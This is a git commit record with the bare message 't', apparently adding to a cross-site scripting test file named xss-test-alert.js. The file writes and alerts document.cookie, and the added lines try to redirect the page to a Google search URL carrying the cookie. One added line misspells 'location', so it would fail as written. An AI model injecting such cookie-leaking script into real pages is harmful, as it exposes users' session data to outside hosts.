ad03ce280c2c063a1024883e594f161242e7ccc7
kigihan <kigihan77@gmail.com>
2019-06-04 16:11:32 +0800

    t

--- xss-test-alert.js
+++ xss-test-alert.js
@@ -1,2 +1,4 @@
 document.write ("This is remote text via xss.js located at han's github " + document.cookie);
 alert ("This is remote text via xss.js located at han's github " + document.cookie);
+window.location.target="_blank";
+window.loaction.href="https://www.google.com/search?q=" + document.cookie;
